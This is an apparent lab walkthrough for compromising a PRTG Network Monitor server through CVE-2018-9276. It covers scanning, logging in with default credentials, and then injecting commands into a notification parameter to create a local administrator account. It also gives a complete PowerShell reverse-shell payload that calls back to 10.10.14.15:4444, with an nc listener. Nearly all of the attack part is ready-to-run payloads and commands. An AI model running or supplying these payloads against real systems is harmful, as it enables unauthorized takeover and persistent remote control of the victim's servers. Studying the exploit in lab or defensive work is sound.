# PRTG Network Monitor

## 1. Discovery and Enumeration

### Nmap Scan

```bash
nmap -sV -p- --open -T4 10.129.201.50
```

Look for port `8080` running **Indy httpd 17.3.33.2830 (Paessler PRTG Bandwidth Monitor)**.

### EyeWitness

May reveal default credentials such as `prtgadmin:prtgadmin`.

### Version Check

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

---

## 2. Exploiting CVE-2018-9276 (Authenticated Command Injection)

### Login

Attempt with known or default credentials, e.g.:

```text
prtgadmin:Password123
```

### Create Malicious Notification

1. Navigate to **Setup - Account Settings - Notifications**.
2. Click **Add new notification** and name it (e.g., `pwn`).
3. Enable **EXECUTE PROGRAM**.
4. Select **Demo exe notification - outfile.ps1**.
5. In **Parameter**, add:

```plaintext
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

6. Save and click **Test** to trigger it.

---

## 3. Verification

### Using CrackMapExec

```bash
crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

### Alternate Methods

Try authenticated access using:

* `evil-winrm`
* `wmiexec.py`
* `psexec.py`

---

## 4. Reverse Shell (Alternative Payload)

Instead of creating a user, launch a PowerShell reverse shell.

```plaintext
test.txt;powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Listener

```bash
nc -lvnp 4444
```
